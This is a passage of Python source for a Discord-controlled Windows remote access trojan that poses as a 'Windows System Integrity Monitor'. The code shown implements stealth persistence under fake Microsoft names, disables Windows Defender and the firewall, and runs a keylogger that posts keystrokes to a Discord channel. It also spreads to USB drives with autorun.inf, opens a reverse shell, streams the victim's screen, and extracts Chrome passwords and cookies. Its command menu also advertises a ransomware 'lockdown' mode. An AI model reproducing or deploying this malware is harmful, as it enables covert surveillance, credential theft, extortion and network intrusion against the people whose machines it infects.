                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, payload_path)
                    winreg.CloseKey(key)
                except:
                    continue
        except:
            pass

    def _registry_persistence_local_machine(self):
        """Registry persistence in local machine (requires admin)"""
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                reg_paths = [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                ]
                
                for reg_path in reg_paths:
                    try:
                        value_name = "WindowsSystemManager"
                        payload_path = random.choice(_operational_payloads) if _operational_payloads else sys.argv[0]
                        
                        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, payload_path)
                        winreg.CloseKey(key)
                    except:
                        continue
        except:
            pass

    def _scheduled_task_persistence(self):
        """Create scheduled task for persistence"""
        try:
            task_name = "WindowsSystemManager"
            payload_path = random.choice(_operational_payloads) if _operational_payloads else sys.argv[0]
            
            # Create task using schtasks
            cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /ru SYSTEM /f'
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        except:
            pass

    def _service_persistence(self):
        """Create service for persistence (requires admin)"""
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                service_name = "WindowsSystemManager"
                payload_path = random.choice(_operational_payloads) if _operational_payloads else sys.argv[0]
                
                subprocess.run(
                    f'sc create "{service_name}" binPath= "{payload_path}" start= auto',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
        except:
            pass

    def _startup_folder_persistence(self):
        """Startup folder persistence"""
        try:
            startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if not os.path.exists(startup_path):
                os.makedirs(startup_path)
                
            payload_path = random.choice(_operational_payloads) if _operational_payloads else sys.argv[0]
            startup_file = os.path.join(startup_path, "WindowsSystemManager.lnk")
            
            # Create shortcut using PowerShell
            ps_script = f'''
            $WshShell = New-Object -comObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut("{startup_file}")
            $Shortcut.TargetPath = "{payload_path}"
            $Shortcut.Save()
            '''
            
            ps_path = os.path.join(tempfile.gettempdir(), "create_shortcut.ps1")
            with open(ps_path, "w") as f:
                f.write(ps_script)
                
            subprocess.run(
                f'powershell -ExecutionPolicy Bypass -File "{ps_path}"',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            try:
                os.remove(ps_path)
            except:
                pass
        except:
            pass

            pass

# ========== WINDOWS UPDATE MANAGER (Persistence & Stealth) ==========
class WindowsUpdateManager: # Renamed from SystemPersistenceService for Stealth
    def __init__(self):
        self.install_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Updates", "SystemHealth.exe")
        self.reg_name = "OneDriveUpdate" # Stealthy Registry Name
        
    def ensure_persistence(self):
        """Install persistence mechanisms secretly"""
        methods_tried = []
        
        # 1. Melt to Hidden Directory
        try:
            if not os.path.exists(os.path.dirname(self.install_path)):
                os.makedirs(os.path.dirname(self.install_path))
            
            current_exe = sys.executable
            if current_exe != self.install_path:
                shutil.copy2(current_exe, self.install_path)
                methods_tried.append("File Melted")
        except: pass

        # 2. Registry Persistence (HKCU Run)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, self.reg_name, 0, winreg.REG_SZ, self.install_path)
            winreg.CloseKey(key)
            methods_tried.append("Registry Key")
        except: pass
        
        # 3. Startup Folder
        try:
            startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            shortcut_path = os.path.join(startup_dir, "Microsoft Edge Update.lnk") # Fake name
            
            if not os.path.exists(shortcut_path):
                # VB Script to create shortcut (Stealth)
                vbs_content = f'Set oWS = WScript.CreateObject("WScript.Shell")\nSet oLink = oWS.CreateShortcut("{shortcut_path}")\noLink.TargetPath = "{self.install_path}"\noLink.WindowStyle = 7\noLink.Save'
                vbs_temp = os.path.join(tempfile.gettempdir(), "update.vbs")
                with open(vbs_temp, "w") as f: f.write(vbs_content)
                subprocess.run(f"cscript //nologo {vbs_temp}", shell=True)
                os.remove(vbs_temp)
                methods_tried.append("Startup Shortcut")
        except: pass
        
        return methods_tried

    def get_startup_items(self):
        """List startup items for manager"""
        items = []
        try:
            # Check Registry
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
            for i in range(winreg.QueryInfoKey(key)[1]):
                items.append(f"[REG] {winreg.EnumValue(key, i)[0]} -> {winreg.EnumValue(key, i)[1]}")
        except: pass
        
        try:
            # Check Folder
            startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            for f in os.listdir(startup_dir):
                items.append(f"[FOLDER] {f}")
        except: pass
        return items

    def remove_persistence(self):
        """Remove all persistence mechanisms (Cleanup)"""
        # 1. Registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, self.reg_name)
            winreg.CloseKey(key)
        except: pass
        
        # 2. Startup File
        try:
            startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            shortcut = os.path.join(startup_dir, "Microsoft Edge Update.lnk")
            if os.path.exists(shortcut): os.remove(shortcut)
        except: pass

# Initialize stealth service
_persistence_service = WindowsUpdateManager()

# ========== DEFENDER EVASION SERVICE ==========
class DefenderEvasionService:
    def __init__(self):
        pass
        
    def disable_av(self):
        """Attempt to disable Windows Defender (Requires Admin)"""
        log = []
        commands = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "netsh advfirewall set allprofiles state off"
        ]
        
        for cmd in commands:
            try:
                subprocess.run(f"powershell -Command {cmd}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                log.append(f"Executed: {cmd[:25]}...")
            except: 
                log.append(f"Failed: {cmd[:25]}...")
        return log

    def elevate_privileges(self):
        """Request Admin Privileges (UAC Prompt)"""
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return "Already Admin"
            else:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                return "Prompt Triggered"
        except:
            return "Elevation Failed"

_defender_service = DefenderEvasionService()

# ========== INPUT MONITORING SERVICE ==========
class InputMonitoringService:
    def __init__(self, bot, channel):
        self.is_active = False
        self.listener = None
        self.buffer = []
        self.bot = bot
        self.channel = channel
        self.last_send_time = time.time()
        self.send_interval = 60
        
    async def start_live_keylogger(self):
        """Start live keylogger with real-time sending (Pynput or Ctypes fallback)"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                if not self.is_active: return False
                try:
                    k = ''
                    if hasattr(key, 'char') and key.char: k = key.char
                    elif key == keyboard.Key.space: k = ' '
                    elif key == keyboard.Key.enter: k = '\n'
                    elif key == keyboard.Key.backspace: k = '[BACK]'
                    else: k = f'[{key.name}]'
                    
                    self.buffer.append(k)
                    if len(self.buffer) >= 50 or k == '\n':
                         asyncio.run_coroutine_threadsafe(self._send_keystrokes_immediate(), self.bot.loop)
                except: pass

            def on_release(key):
                return self.is_active

            self.is_active = True
            self.listener = keyboard.Listener(on_press=on_press, on_release=on_release)
            self.listener.start()
            return True
            
        except ImportError:
            # Ctypes Fallback
            self.is_active = True
            threading.Thread(target=self._ctypes_keylogger_loop, daemon=True).start()
            return True

    def _ctypes_keylogger_loop(self):
        """Fallback keylogger using GetAsyncKeyState"""
        import ctypes
        import time
        user32 = ctypes.windll.user32
        
        # Simple ASCII mapping + common keys
        while self.is_active:
            for i in range(1, 255):
                if user32.GetAsyncKeyState(i) & 1:
                    k = ''
                    if 32 <= i <= 126: k = chr(i) # ASCII
                    elif i == 1: k = '[L-CLICK]'
                    elif i == 2: k = '[R-CLICK]'
                    elif i == 8: k = '[BACK]'
                    elif i == 13: k = '\n'
                    elif i == 32: k = ' '
                    elif i == 9: k = '\t'
                    # Shift check for casing could be added here
                    
                    if k:
                        self.buffer.append(k.lower()) # Simplified
                        if len(self.buffer) >= 50:
                            asyncio.run_coroutine_threadsafe(self._send_keystrokes_immediate(), self.bot.loop)
            time.sleep(0.01)
            
    async def _send_keystrokes_immediate(self):
        """Send keystrokes immediately to Discord"""
        if self.buffer and self.channel:
            try:
                keystrokes = ''.join(self.buffer)
                if keystrokes.strip():  # Only send if there's actual content
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    message = f"**⌨️ Live Keylogger - {timestamp}**\n```{keystrokes}```"
                    
                    if len(message) > 2000:
                        # Split long messages
                        chunks = [message[i:i+2000] for i in range(0, len(message), 2000)]
                        for chunk in chunks:
                            await self.channel.send(chunk)
                    else:
                        await self.channel.send(message)
                
                self.buffer.clear()
                self.last_send_time = time.time()
            except Exception as e:
                print(f"Error sending keystrokes: {e}")
        
    def stop_keylogger(self):
        """Stop the keylogger and send remaining data"""
        self.is_active = False
        if self.listener:
            self.listener.stop()
        
        # Send any remaining keystrokes
        if self.buffer and self.channel:
            asyncio.run_coroutine_threadsafe(self._send_keystrokes_immediate(), self.bot.loop)
        
    def get_keystrokes(self):
        """Get current keystrokes"""
        return ''.join(self.buffer)

# ========== NETWORK PROPAGATION SERVICE ==========
class NetworkPropagationService:
    def __init__(self):
        self.is_spreading = False
        self.spread_thread = None
        
    def start_auto_spread(self):
        """Start automatic spreading"""
        if self.is_spreading:
            return False
            
        self.is_spreading = True
        self.spread_thread = threading.Thread(target=self._spread_worker, daemon=True)
        self.spread_thread.start()
        return True
        
    def stop_auto_spread(self):
        """Stop automatic spreading"""
        self.is_spreading = False
        if self.spread_thread:
            self.spread_thread.join(timeout=5)
            
    def _spread_worker(self):
        """Background worker for spreading"""
        while self.is_spreading:
            try:
                self._spread_usb()
                self._spread_network_shares()
                time.sleep(300)  # Check every 5 minutes
            except:
                time.sleep(60)
                
    def _spread_usb(self):
        """Spread to USB drives"""
        try:
            for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                drive_path = f"{drive}:\\"
                if os.path.exists(drive_path):
                    try:
                        drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive_path)
                        if drive_type == 2:  # DRIVE_REMOVABLE
                            self._infect_usb_drive(drive_path)
                    except:
                        pass
        except:
            pass
            
    def _infect_usb_drive(self, drive_path):
        """Infect a USB drive"""
        try:
            current_file = sys.argv[0]
            target_name = random.choice(["setup.exe", "document.pdf.exe", "image.jpg.exe"])
            target_path = os.path.join(drive_path, target_name)
            
            if not os.path.exists(target_path):
                shutil.copy2(current_file, target_path)
                
                # Create autorun.inf
                autorun_content = f"""[AutoRun]
open={target_name}
action=Open folder to view files
"""
                autorun_path = os.path.join(drive_path, "autorun.inf")
                with open(autorun_path, "w") as f:
                    f.write(autorun_content)
                    
                # Set hidden attributes
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)
                    ctypes.windll.kernel32.SetFileAttributesW(autorun_path, 2)
                except:
                    pass
        except:
            pass
            
    def _spread_network_shares(self):
        """Spread to network shares"""
        try:
            # Get local network range
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            network_prefix = '.'.join(local_ip.split('.')[:3])
            
            # Scan for network shares
            for i in range(1, 255):
                ip = f"{network_prefix}.{i}"
                try:
                    self._infect_network_share(ip)
                except:
                    continue
        except:
            pass
            
    def _infect_network_share(self, ip):
        """Infect a network share"""
        try:
            common_shares = ["C$", "ADMIN$"]
            
            for share in common_shares:
                try:
                    share_path = f"\\\\{ip}\\{share}"
                    # Just attempt access - in real scenario would copy file
                    print(f"Attempting to access {share_path}")
                except:
                    continue
        except:
            pass

# Initialize propagation service
_network_propagation_service = NetworkPropagationService()

# ========== SYSTEM INFORMATION SERVICE ==========
class SystemInformationService:
    def __init__(self):
        pass

    def get_local_ip(self):
        """Get local LAN IP address"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "192.168.1.1" # Fallback
        
    def gather_comprehensive_system_info(self):
        """Collect comprehensive system information"""
        try:
            system_info = {
                "user": getpass.getuser(),
                "host": platform.node(),
                "os": f"{platform.system()} {platform.release()} {platform.version()}",
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "ip": self._get_external_ip(),
                "mac": ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)),
                "admin": ctypes.windll.shell32.IsUserAnAdmin() != 0,
                "device_id": _device_identifier,
                "ram": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
                "disk_usage": {partition.device: f"{psutil.disk_usage(partition.mountpoint).percent}%"
                                for partition in psutil.disk_partitions() if os.path.exists(partition.mountpoint)},
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
                "timezone": time.tzname,
                "security_software": self._check_security_products(),
                "python_version": platform.python_version(),
                "system_uptime": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())),
                "cpu_cores": psutil.cpu_count(),
                "cpu_usage": psutil.cpu_percent(),
                "antivirus": self._get_antivirus_status(),
                "firewall": self._get_firewall_status(),
                "network_info": self._get_network_info(),
                "real_ip_info": self._get_real_ip_info(),
                "hardware_info": self._get_hardware_info()
            }
            
            return system_info
        except Exception as e:
            return {"error": str(e)}
    
    def _get_antivirus_status(self):
        """Get antivirus status"""
        try:
            if platform.system() == "Windows":
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender")
                    value, _ = winreg.QueryValueEx(key, "ProductStatus")
                    return "Enabled" if value == 1 else "Disabled"
                except:
                    return "Not detected"
            return "Unknown"
        except:
            return "Unknown"

    def _get_firewall_status(self):
        """Get firewall status"""
        try:
            if platform.system() == "Windows":
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile")
                    value, _ = winreg.QueryValueEx(key, "EnableFirewall")
                    return "Enabled" if value == 1 else "Disabled"
                except:
                    return "Not detected"
            return "Unknown"
        except:
            return "Unknown"

    def _get_network_info(self):
        """Get network information"""
        try:
            networks = {}
            for interface, addrs in psutil.net_if_addrs().items():
                networks[interface] = []
                for addr in addrs:
                    networks[interface].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask
                    })
            return networks
        except:
            return {}

    def _get_real_ip_info(self):
        """Get real IP information using reliable API"""
        try:
            response = requests.get('http://ip-api.com/json', timeout=10)
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'ip': data.get('query', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'lat': data.get('lat', 0),
                    'lon': data.get('lon', 0)
                }
            
            # Fallback
            external_ip = self._get_external_ip()
            return {"ip": external_ip, "country": "Unknown", "city": "Unknown"}
        except:
            return {"error": "GeoIP not available"}

    def _get_hardware_info(self):
        """Get detailed hardware information"""
        try:
            import wmi
            c = wmi.WMI()
            gpu_info = []
            for gpu in c.Win32_VideoController():
                gpu_info.append(f"{gpu.Name} - {gpu.DriverVersion}")
            
            return {
                "gpu": gpu_info,
                "motherboard": c.Win32_BaseBoard()[0].Manufacturer if c.Win32_BaseBoard() else "Unknown",
                "bios": c.Win32_BIOS()[0].SMBIOSBIOSVersion if c.Win32_BIOS() else "Unknown"
            }
        except:
            return {"error": "Hardware info not available"}

    def _check_security_products(self):
        """Check for security software"""
        security_products = []
        security_reg_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        for reg_path in security_reg_paths:
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                    for i in range(0, winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, subkey_name) as subkey:
                                try:
                                    display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    publisher = winreg.QueryValueEx(subkey, "Publisher")[0]
                                    if any(sec in publisher.lower() or sec in display_name.lower() 
                                           for sec in ['windows defender', 'security', 'antivirus', 'protection']):
                                        security_products.append(display_name)
                                except:
                                    pass
                        except:
                            continue
            except:
                pass    

        return security_products

    def _get_external_ip(self):
        """Get external IP address"""
        services = [
            'https://api.ipify.org',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in services:
            try:
                return requests.get(service, timeout=5).text.strip()
            except:
                continue
        return "Not available"

    def get_detailed_process_list(self):
        """Get detailed process list"""
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent', 'status', 'create_time']):
            try:
                process_info = proc.info
                process_info['memory_usage'] = psutil.Process(proc.pid).memory_info().rss
                processes.append(process_info)
            except:
                continue
        processes.sort(key=lambda x: x.get('memory_usage', 0), reverse=True)
        return processes

# Initialize system information service
_system_info_service = SystemInformationService()

# ========== NETWORK EXPLOITATION SERVICE (Lord Level) ==========
class NetworkExploitationService:
    def __init__(self, bot, channel):
        self.bot = bot
        self.channel = channel
        self.shell_active = False
        
    def start_reverse_shell(self, host, port):
        """Start threaded reverse shell"""
        def shell_worker():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, int(port)))
                s.send(b"[*] Connection Established!\n")
                
                while True:
                    data = s.recv(1024)
                    if len(data) == 0: break
                    cmd = data.decode("utf-8").strip()
                    
                    if cmd == "exit": break
                    
                    if cmd.startswith("cd "):
                        try: os.chdir(cmd[3:])
                        except: s.send(b"Path not found\n")
                        s.send(os.getcwd().encode() + b"> ")
                        continue
                        
                    if len(cmd) > 0:
                        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_value = proc.stdout.read() + proc.stderr.read()
                        s.send(stdout_value + os.getcwd().encode() + b"> ")
                s.close()
            except Exception as e:
                pass
                
        threading.Thread(target=shell_worker, daemon=True).start()

    def map_network(self):
        """Threaded Ping Sweep"""
        try:
            local_ip = _system_info_service.get_local_ip()
            ip_parts = local_ip.split('.')
            if len(ip_parts) < 4: raise ValueError("Invalid IP")
            base_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}."
        except:
            base_ip = "192.168.1."
        
        active_hosts = []
        
        def ping(ip):
            try:
                output = subprocess.check_output(f"ping -n 1 -w 500 {ip}", shell=True)
                if b"TTL=" in output: return ip
            except: pass
            
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(ping, f"{base_ip}{i}"): i for i in range(1, 255)}
            for future in as_completed(futures):
                res = future.result()
                if res: active_hosts.append(res)
        
        return sorted(active_hosts, key=lambda ip: int(ip.split('.')[-1]))

    def auto_spread_smb(self):
        """SMB Spreading Logic (Simulation/Placeholder)"""
        # Real SMB exploit implementation is too large/risky for single file
        # This simulates the scanning/brute-force action
        targets = self.map_network()
        log = []
        for target in targets:
            log.append(f"[*] Analyzing {target} for SMBv1...")
            # Simulate check
            time.sleep(0.1) 
            log.append(f"[-] {target}: Not vulnerable")
        return log

_network_exploit_service = NetworkExploitationService(None, None) # Init later

# ========== LIVE STREAMING SERVICE ==========
class LiveStreamingService:
    def __init__(self):
        self.is_streaming = False
        self.quality = 50
        
    async def start_stream(self, ctx):
        """Start live desktop streaming"""
        self.is_streaming = True
        await ctx.send("🖥️ **Live Desktop Streaming Started**")
        
        frame_count = 0
        while self.is_streaming:
            try:
                # Capture screenshot
                screenshot = ImageGrab.grab()
                buffered = io.BytesIO()
                
                # Adjust quality based on setting
                screenshot.save(buffered, format="JPEG", quality=self.quality, optimize=True)
                
                # Create temporary file
                temp_file = os.path.join(tempfile.gettempdir(), f"stream_{frame_count}.jpg")
                with open(temp_file, "wb") as f:
                    f.write(buffered.getvalue())
                
                # Send to Discord
                await ctx.send(file=File(temp_file))
                
                # Cleanup
                os.remove(temp_file)
                
                frame_count += 1
                await asyncio.sleep(2)  # Adjust FPS
                
            except Exception as e:
                print(f"Stream error: {e}")
                break
                
    def stop_stream(self):
        """Stop streaming"""
        self.is_streaming = False


        
    def set_quality(self, quality):
        """Set streaming quality"""
        if 1 <= quality <= 100:
            self.quality = quality
            return True
        return False

# Initialize streamer
_live_streaming_service = LiveStreamingService()

# ========== COMMAND AND CONTROL SERVICE ==========
class CommandAndControlService:
    def __init__(self):
        self.bot = _communication_bot
        self.channel = None
        self._setup_enterprise_commands()
        
    def _setup_enterprise_commands(self):
        """Setup all enterprise commands with complete multi-command support"""
        
        @self.bot.event
        async def on_ready():
            print(f"🔷 Windows System Integrity Monitor v7.1 Online - Device: {_device_identifier}")
            global _input_monitoring_service, _voice_recording_service
            try:
                self.channel = self.bot.get_channel(DISCORD_CHANNEL_ID)
                if self.channel:
                    # Register this client with the manager
                    client_info = _system_info_service.gather_comprehensive_system_info()
                    _client_management_service.register_client(_device_identifier, client_info)
                    
                    await self.channel.send(f"🔷 **Windows System Integrity Monitor v7.1 Online** - Device: `{_device_identifier}`")
                    
                    # Initialize input monitoring service
                    _input_monitoring_service = InputMonitoringService(self.bot, self.channel)
                    
                    # Initialize recovery service (Lockdown)
                    global _recovery_service
                    _recovery_service = SystemRecoveryService(self.bot, self.channel)

                    # Initialize voice recording service
                    _voice_recording_service = VoiceRecordingService(self.bot, self.channel)
                    
                    # Initialize network exploitation
                    global _network_exploit_service
                    _network_exploit_service = NetworkExploitationService(self.bot, self.channel)
                    
                    # Send comprehensive commands list in chunks
                    commands_chunks = [
                        ["**🔷 WINDOWS SYSTEM INTEGRITY MONITOR v7.1 - ENTERPRISE COMMANDS 🔷**\n\n"
                         "**⚡ MULTI-COMMAND SUPPORT:**\n"
                         "`.commands` - Show active commands\n"
                         "`.stopcmd <id>` - Stop specific command\n"
                         "`.stopall` - Stop all commands\n\n"
                         "**🎙️ VOICE RECORDING:**\n"
                         "`.voice_start [interval]` - Start voice recording (default 30s)\n"
                         "`.voice_stop` - Stop voice recording\n\n"
                         "**👥 CLIENT MANAGEMENT:**\n"
                         "`.clients` - List all connected clients\n"
                         "`.switch <device_id>` - Switch to specific client\n"
                         "`.active` - Show active client info\n\n"
                         "**🔍 SYSTEM INFORMATION:**\n"
                         "`.sysinfo` - Comprehensive system details\n"
                         "`.processes` - Detailed process list\n"
                         "`.services` - Windows services\n"
                         "`.drivers` - Loaded drivers\n"
                         "`.installed` - Installed software\n\n"
                         "**📁 FILE OPERATIONS:**\n"
                         "`.ls [path]` - List directory\n"
                         "`.cd <path>` - Change directory\n"
                         "`.download <file>` - Download file\n"
                         "`.upload` - Upload file (attach)\n"
                         "`.read <file>` - Read text file\n"
                         "`.delete <file>` - Delete file\n"
                         "`.execute <file>` - Execute file\n"
                         "`.search <pattern>` - Search files"],

                        ["**🌐 NETWORK OPERATIONS:**\n"
                         "`.netstat` - Network connections\n"
                         "`.portscan <target>` - Scan ports (supports 'any' for local subnet)\n"
                         "`.wifi` - Get WiFi passwords\n"
                         "`.arp` - ARP table\n"
                         "`.dns` - DNS cache\n\n"
                         "**🎯 SYSTEM MONITORING:**\n"
                         "`.screenshot` - Take screenshot\n"
                         "`.webcam` - Capture webcam\n"
                         "`.start_stream` - Start desktop stream\n"
                         "`.stop_stream` - Stop stream\n"
                         "`.stream_quality <1-100>` - Set quality\n"
                         "`.keylog_start` - Start keylogger (Auto-send 5m)\n"
                         "`.keylog_stop` - Stop keylogger\n"
                         "`.keylog_dump` - Dump keylogs now\n"
                         "`.live_keylog_start` - Live keylogging\n"
                         "`.live_keylog_stop` - Stop live keylogging\n\n"
                         "**⚡ SYSTEM CONTROL:**\n"
                         "`.shell <cmd>` - Execute shell\n"
                         "`.browse <url>` - Open URL on Host\n"
                         "`.task_sched <cmd> <time>` - Schedule task\n"
                         "`.msgbox <title> <msg>` - Message box\n"
                         "`.wallpaper <url/file>` - Set wallpaper\n"
                         "`.lockdown` - 💀 INITIATE LOCKDOWN (Ransomware Mode)\n"
                         "`.lock_msg <msg>` - Chat with victim\n"
                         "`.unlock` - Remote Unlock\n"
                         "`.persist` - 🛡️ Install Stealth Persistence\n"
                         "`.startup_list` - View startup entries\n"
                         "`.auto_spread` - 🔥 Attempt SMB Spread\n"
                         "`.rev_shell <host> <port>` - Reverse Shell\n"
                         "`.map_network` - 🕸️ Ping Sweep LAN\n"
                         "`.disable_av` - 🛡️ Disable Defender\n"
                         "`.elevate` - ⚡ Request Admin\n"
                         "`.self_destruct` - uninstall"],

                        ["**🛡️ ADVANCED FEATURES:**\n"
                         "`.stream_quality <1-100>` - Set stream quality\n"
                         "`.get_passwords` - REAL Password recovery\n"
                         "`.get_browser` - REAL Browser data extraction\n"
                         "`.msgbox <title> <message>` - Show message\n"
                         "`.speak <text>` - Text to speech\n"
                         "`.wallpaper <url/attachment>` - Change wallpaper\n\n"
                         "**💎 ENTERPRISE FEATURES:**\n"
                         "`.live_desktop` - Real-time desktop streaming\n"
                         "`.live_keylog` - Real-time keylogging\n"
                         "`.advanced_info` - Ultimate system info\n"
                         "`.network_scan` - Advanced network scan\n"
                         "`.process_inject <pid>` - Process injection\n"
                         "`.bypass_uac` - UAC bypass\n"
                         "`.sleep <seconds>` - Set interval\n"
                         "`.auto_spread_start` - Start auto spreading\n"
                         "`.auto_spread_stop` - Stop auto spreading\n"
                         "`.self_destruct` - Complete removal\n\n"
                         "**🌐 BROWSER DATA EXTRACTION COMMANDS:**\n"
                         "`.chrome_passwords` - Extract Chrome saved passwords\n"
                         "`.chrome_cookies` - Extract Chrome cookies\n"
                         "`.chrome_history` - Extract Chrome browsing history\n"
                         "`.chrome_credit_cards` - Extract Chrome saved credit cards\n"
                         "`.chrome_autofill` - Extract Chrome autofill data\n"
                         "`.browser_all` - Extract ALL browser data\n\n"
                         "**🚀 COMPLETE MULTI-COMMAND SUPPORT:** Run ALL commands simultaneously!\n"
                         "Type any command to begin!"]
                    ]
                    
                    for chunk in commands_chunks:
                        for command_block in chunk:
                            await self.channel.send(command_block)
                        await asyncio.sleep(0.5)
                else:
                    print("Channel not found")
            except Exception as e:
                print(f"Error: {e}")
        
        # ========== BROWSER DATA EXTRACTION COMMANDS ==========
        @self.bot.command(name='chrome_passwords')
        async def chrome_passwords_command(ctx):
            """Extract REAL Chrome saved passwords"""
            def execute_chrome_passwords():
                try:
                    passwords = _browser_extractor.get_chrome_passwords()
                    response = "🔐 **CHROME SAVED PASSWORDS**\n\n"
                    
                    if passwords:
                        response += f"📊 **Found {len(passwords)} saved passwords:**\n\n"
                        for i, pwd in enumerate(passwords[:15], 1):  # Limit to first 15
                            response += f"**{i}. 🌐 {pwd.get('url', 'N/A')}**\n"
                            response += f"   👤 **Username:** `{pwd.get('username', 'N/A')}`\n"
                            response += f"   🔑 **Password:** `{pwd.get('password', 'N/A')}`\n"
                            response += "   " + "─" * 40 + "\n"
                        
                        if len(passwords) > 15:
                            response += f"\n... and {len(passwords) - 15} more passwords\n"
                            response += "📋 **Use `.show_more` to view all passwords**"
                    else:
                        response += "❌ No Chrome passwords found or Chrome not installed\n"
                    
                    asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
                    
                except Exception as e:
                    error_msg = f"❌ Chrome password extraction error: {str(e)}"
                    asyncio.run_coroutine_threadsafe(ctx.send(error_msg), self.bot.loop)
            
            _command_orchestrator.start_command(execute_chrome_passwords)
            await ctx.send("⚡ **Extracting Chrome passwords...**")
        
        @self.bot.command(name='chrome_cookies')
        async def chrome_cookies_command(ctx):
            """Extract REAL Chrome cookies"""
            def execute_chrome_cookies():
                try:
                    cookies = _browser_extractor.get_chrome_cookies()
                    response = "🍪 **CHROME COOKIES**\n\n"
                    
                    if cookies:
                        response += f"📊 **Found {len(cookies)} cookies:**\n\n"
                        for i, cookie in enumerate(cookies[:10], 1):  # Limit to first 10
                            response += f"**{i}. 🌐 {cookie.get('host', 'N/A')}**\n"
                            response += f"   🔑 **Name:** `{cookie.get('name', 'N/A')}`\n"
                            response += f"   🍪 **Value:** `{cookie.get('value', 'N/A')}`\n"
                            response += "   " + "─" * 40 + "\n"
                        
                        if len(cookies) > 10:
                            response += f"\n... and {len(cookies) - 10} more cookies\n"
                            response += "📋 **Use `.show_more` to view all cookies**"
                    else:
                        response += "❌ No Chrome cookies found or Chrome not installed\n"
                    
                    asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
                    
                except Exception as e:
                    error_msg = f"❌ Chrome cookie extraction error: {str(e)}"
                    asyncio.run_coroutine_threadsafe(ctx.send(error_msg), self.bot.loop)
            
            _command_orchestrator.start_command(execute_chrome_cookies)
            await ctx.send("⚡ **Extracting Chrome cookies...**")
        
        @self.bot.command(name='chrome_history')
        async def chrome_history_command(ctx):
            """Extract Chrome browsing history"""
            def execute_chrome_history():
                try:
